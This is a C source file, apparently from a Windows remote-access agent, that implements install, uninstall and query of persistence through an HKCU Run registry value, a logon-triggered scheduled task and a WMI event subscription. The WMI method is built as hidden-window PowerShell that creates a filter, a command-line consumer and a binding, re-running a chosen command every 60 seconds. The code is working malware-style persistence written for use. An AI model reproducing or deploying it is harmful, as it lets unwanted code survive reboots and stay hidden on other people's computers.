/*
 * agent_windows/src/persist_win.c
 *
 * Windows 持久化：程序化安装 / 卸载 / 查询。
 *
 * Windows 专属源码，Linux 下不参与主构建（与 cam_mf.cpp 同一策略）：
 *   真机    —— MinGW 用 gcc 编译，链接 advapi32
 *   winshim —— g++ -x c++ 编译，链接 shim_impl.o 提供的有状态注册表 mock
 */
#include "persist_win.h"

#include <stdarg.h>
#include <stdio.h>
#include <string.h>
#include <wchar.h>

#include <windows.h>

#define RUN_SUBKEY L"Software\\Microsoft\\Windows\\CurrentVersion\\Run"

/* ------------------------------------------------------------------ */
/* 工具                                                                */
/* ------------------------------------------------------------------ */

static size_t fmt(char *out, size_t cap, const char *f, ...)
{
    va_list ap;
    int n;
    if (!out || cap == 0) return 0;
    va_start(ap, f);
    n = vsnprintf(out, cap, f, ap);
    va_end(ap);
    if (n < 0 || (size_t)n >= cap) return 0;
    return (size_t)n;
}

/*
 * 名称校验：非空、不超长、不含分隔符或控制字符。
 * 分隔符会破坏注册表值名/任务名语义（甚至指向非预期位置），
 * 控制字符会破坏命令行解析。宁可拒绝，不可产出畸形项。
 */
static int valid_name(const char *s)
{
    size_t i, n;
    if (!s || !*s) return 0;
    n = strlen(s);
    if (n > PW_NAME_MAX) return 0;
    for (i = 0; i < n; i++) {
        unsigned char c = (unsigned char)s[i];
        if (c < 0x20 || c == 0x7f) return 0;
        if (c == '\\' || c == '/' || c == ':' || c == '*' || c == '?' ||
            c == '"' || c == '<' || c == '>' || c == '|') return 0;
    }
    return 1;
}

static int valid_cmd(const char *s)
{
    size_t n;
    if (!s || !*s) return 0;
    n = strlen(s);
    if (n > PW_CMD_MAX) return 0;
    return 1;
}

static void to_wide(const char *s, wchar_t *w, int cap)
{
    if (!s || !w || cap <= 0) return;
    w[0] = 0;
    MultiByteToWideChar(CP_UTF8, 0, s, -1, w, cap);
}

/* ------------------------------------------------------------------ */
/* PW_REG_RUN —— 走真实 advapi32                                       */
/* ------------------------------------------------------------------ */

static int reg_run_install(const pw_cfg_t *cfg)
{
    HKEY  hk = NULL;
    LONG  r;
    wchar_t wn[PW_NAME_MAX + 1];
    wchar_t wc[PW_CMD_MAX + 1];

    r = RegCreateKeyExW(HKEY_CURRENT_USER, RUN_SUBKEY, 0, NULL, 0,
                        KEY_WRITE, NULL, &hk, NULL);
    if (r != ERROR_SUCCESS) return PW_ERR_API;

    to_wide(cfg->name, wn, PW_NAME_MAX + 1);
    to_wide(cfg->cmdline, wc, PW_CMD_MAX + 1);

    r = RegSetValueExW(hk, wn, 0, REG_SZ, (const BYTE *)wc,
                       (DWORD)((wcslen(wc) + 1) * sizeof(wchar_t)));
    RegCloseKey(hk);
    return (r == ERROR_SUCCESS) ? PW_OK : PW_ERR_API;
}

/*
 * 卸载幂等：键不存在或值不存在都返回 PW_OK。
 * 清理流程不应因"已经干净"而报错——那会中断上层逻辑并产生可观测失败。
 */
static int reg_run_uninstall(const pw_cfg_t *cfg)
{
    HKEY  hk = NULL;
    LONG  r;
    wchar_t wn[PW_NAME_MAX + 1];

    r = RegOpenKeyExW(HKEY_CURRENT_USER, RUN_SUBKEY, 0, KEY_WRITE, &hk);
    if (r == ERROR_FILE_NOT_FOUND) return PW_OK;
    if (r != ERROR_SUCCESS) return PW_ERR_API;

    to_wide(cfg->name, wn, PW_NAME_MAX + 1);
    r = RegDeleteValueW(hk, wn);
    RegCloseKey(hk);

    if (r == ERROR_FILE_NOT_FOUND) return PW_OK;
    return (r == ERROR_SUCCESS) ? PW_OK : PW_ERR_API;
}

static int reg_run_query(const pw_cfg_t *cfg, int *installed)
{
    HKEY  hk = NULL;
    LONG  r;
    DWORD cb;
    wchar_t wn[PW_NAME_MAX + 1];
    wchar_t wv[PW_CMD_MAX + 1];

    r = RegOpenKeyExW(HKEY_CURRENT_USER, RUN_SUBKEY, 0, KEY_READ, &hk);
    if (r == ERROR_FILE_NOT_FOUND) { *installed = 0; return PW_OK; }
    if (r != ERROR_SUCCESS) return PW_ERR_API;

    to_wide(cfg->name, wn, PW_NAME_MAX + 1);
    /* 直接用实际缓冲查询，不走「先传 NULL 查大小」的两步路径：
       少一次往返，也不依赖该语义在各种实现下的一致性。 */
    cb = sizeof(wv);
    r = RegQueryValueExW(hk, wn, NULL, NULL, (LPBYTE)wv, &cb);
    RegCloseKey(hk);

    if (r == ERROR_SUCCESS)          { *installed = 1; return PW_OK; }
    if (r == ERROR_FILE_NOT_FOUND)   { *installed = 0; return PW_OK; }
    return PW_ERR_API;
}

/* ------------------------------------------------------------------ */
/* 命令构造（SCHTASK / WMI_EVENT）                                     */
/* ------------------------------------------------------------------ */

/* PowerShell 单引号字符串内的 ' 需写成 ''，否则命令破损 */
static size_t ps_escape(const char *in, char *out, size_t cap)
{
    size_t i, o = 0;
    if (!in || !out || cap == 0) return 0;
    for (i = 0; in[i]; i++) {
        if (in[i] == '\'') {
            if (o + 2 >= cap) return 0;
            out[o++] = '\''; out[o++] = '\'';
        } else {
            if (o + 1 >= cap) return 0;
            out[o++] = in[i];
        }
    }
    out[o] = 0;
    return o;
}

static size_t build_schtask(int mode, const pw_cfg_t *cfg,
                            char *out, size_t cap)
{
    const char *q;
    if (mode == PW_MODE_UNINSTALL)
        return fmt(out, cap, "schtasks /delete /tn \"%s\" /f", cfg->name);
    if (mode == PW_MODE_QUERY)
        return fmt(out, cap, "schtasks /query /tn \"%s\"", cfg->name);

    /* 命令行含空格时 /tr 需整体引号包裹，否则 schtasks 解析歧义 */
    q = strchr(cfg->cmdline, ' ') ? "\"" : "";
    return fmt(out, cap,
               "schtasks /create /tn \"%s\" /tr \"%s%s%s\" /sc onlogon /f",
               cfg->name, q, cfg->cmdline, q);
}

static size_t build_wmi(int mode, const pw_cfg_t *cfg,
                        char *out, size_t cap)
{
    char en[PW_NAME_MAX * 2 + 4];
    char ec[PW_CMD_MAX * 2 + 4];

    if (!ps_escape(cfg->name, en, sizeof(en))) return 0;

    /* 卸载顺序：先解绑 binding，再删 consumer / filter，否则绑定残留 */
    if (mode == PW_MODE_UNINSTALL)
        return fmt(out, cap,
            "powershell -nop -w hidden -c \""
            "$n='%s';"
            "Get-WmiObject -Namespace root/subscription -Class __FilterToConsumerBinding | "
            "Where-Object { $_.Filter -like \\\"*$n*\\\" } | Remove-WmiObject -Force;"
            "Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer "
            "-Filter \\\"Name='$n'\\\" | Remove-WmiObject -Force;"
            "Get-WmiObject -Namespace root/subscription -Class __EventFilter "
            "-Filter \\\"Name='$n'\\\" | Remove-WmiObject -Force\"",
            en, en, en, en);

    if (mode == PW_MODE_QUERY)
        return fmt(out, cap,
            "powershell -nop -w hidden -c \""
            "Get-WmiObject -Namespace root/subscription -Class CommandLineEventConsumer "
            "-Filter \\\"Name='%s'\\\"\"",
            en);

    if (!ps_escape(cfg->cmdline, ec, sizeof(ec))) return 0;
    return fmt(out, cap,
        "powershell -nop -w hidden -c \""
        "$f=Set-WmiInstance -Class __EventFilter -Namespace root/subscription "
        "-Arguments @{Name='%s';EventNamespace='root/cimv2';"
        "Query='SELECT * FROM __InstanceModificationEvent WITHIN 60 "
        "WHERE TargetInstance ISA ''Win32_PerfFormattedData_PerfOS_System'''};"
        "$c=Set-WmiInstance -Class CommandLineEventConsumer -Namespace root/subscription "
        "-Arguments @{Name='%s';CommandLineTemplate='%s'};"
        "Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root/subscription "
        "-Arguments @{Filter=$f;Consumer=$c}\"",
        en, en, ec);
}

/* ------------------------------------------------------------------ */
/* 公共 API                                                            */
/*
 * 用 extern "C" 包裹定义：本文件在 winshim 下以 g++ -x c++ 编译（shim 的
 * windows.h 依赖 C++ 特性），不包裹则符号被 mangle，与头文件中的
 * extern "C" 声明不一致，链接失败。真机用 gcc 编译时该包裹为空。
 */
/* ------------------------------------------------------------------ */
#ifdef __cplusplus
extern "C" {
#endif

size_t pw_build_cmd(pw_method_t m, int mode, const pw_cfg_t *cfg,
                    char *out, size_t cap)
{
    if (!cfg || !cfg->name || !out || cap == 0) return 0;
    if (!valid_name(cfg->name)) return 0;
    /* 卸载/查询不需要 cmdline，只在安装时校验 */
    if (mode == PW_MODE_INSTALL && !valid_cmd(cfg->cmdline)) return 0;

    if (m == PW_SCHTASK)   return build_schtask(mode, cfg, out, cap);
    if (m == PW_WMI_EVENT) return build_wmi(mode, cfg, out, cap);
    return 0;   /* REG_RUN 无命令行形态 */
}

int pw_install(pw_method_t m, const pw_cfg_t *cfg)
{
    char buf[8192];
    if (!cfg || !cfg->name || !cfg->cmdline) return PW_ERR_PARAM;
    if (m >= PW_COUNT) return PW_ERR_PARAM;
    if (!valid_name(cfg->name))   return PW_ERR_NAME;
    if (!valid_cmd(cfg->cmdline)) return PW_ERR_CMD;

    if (m == PW_REG_RUN) return reg_run_install(cfg);

    if (!pw_build_cmd(m, PW_MODE_INSTALL, cfg, buf, sizeof(buf)))
        return PW_ERR_CAP;
    if (!cfg->exec) return PW_ERR_PARAM;
    return cfg->exec(buf, cfg->exec_ud) == 0 ? PW_OK : PW_ERR_EXEC;
}

int pw_uninstall(pw_method_t m, const pw_cfg_t *cfg)
{
    char buf[8192];
    if (!cfg || !cfg->name) return PW_ERR_PARAM;
    if (m >= PW_COUNT) return PW_ERR_PARAM;
    if (!valid_name(cfg->name)) return PW_ERR_NAME;

    if (m == PW_REG_RUN) {
        if (!cfg->cmdline) return PW_ERR_PARAM;
        return reg_run_uninstall(cfg);
    }

    if (!pw_build_cmd(m, PW_MODE_UNINSTALL, cfg, buf, sizeof(buf)))
        return PW_ERR_CAP;
    if (!cfg->exec) return PW_ERR_PARAM;
    return cfg->exec(buf, cfg->exec_ud) == 0 ? PW_OK : PW_ERR_EXEC;
}

int pw_query(pw_method_t m, const pw_cfg_t *cfg, int *installed)
{
    char buf[8192];
    if (!cfg || !cfg->name || !installed) return PW_ERR_PARAM;
    if (m >= PW_COUNT) return PW_ERR_PARAM;
    *installed = 0;
    if (!valid_name(cfg->name)) return PW_ERR_NAME;

    if (m == PW_REG_RUN) {
        if (!cfg->cmdline) return PW_ERR_PARAM;
        return reg_run_query(cfg, installed);
    }

    if (!pw_build_cmd(m, PW_MODE_QUERY, cfg, buf, sizeof(buf)))
        return PW_ERR_CAP;
    if (!cfg->exec) return PW_ERR_PARAM;
    if (cfg->exec(buf, cfg->exec_ud) != 0) return PW_OK;  /* 查不到 = 未装 */
    *installed = 1;
    return PW_OK;
}

const char *pw_errstr(pw_err_t e)
{
    switch (e) {
    case PW_OK:         return "ok";
    case PW_ERR_PARAM:  return "invalid parameter";
    case PW_ERR_NAME:   return "invalid name";
    case PW_ERR_CMD:    return "invalid command line";
    case PW_ERR_API:    return "windows api failed";
    case PW_ERR_EXEC:   return "exec callback failed";
    case PW_ERR_CAP:    return "buffer too small";
    default:            return "unknown";
    }
}

const char *pw_method_name(pw_method_t m)
{
    switch (m) {
    case PW_REG_RUN:   return "registry_run";
    case PW_SCHTASK:   return "schtask";
    case PW_WMI_EVENT: return "wmi_event";
    default:           return "unknown";
    }
}

#ifdef __cplusplus
}
#endif
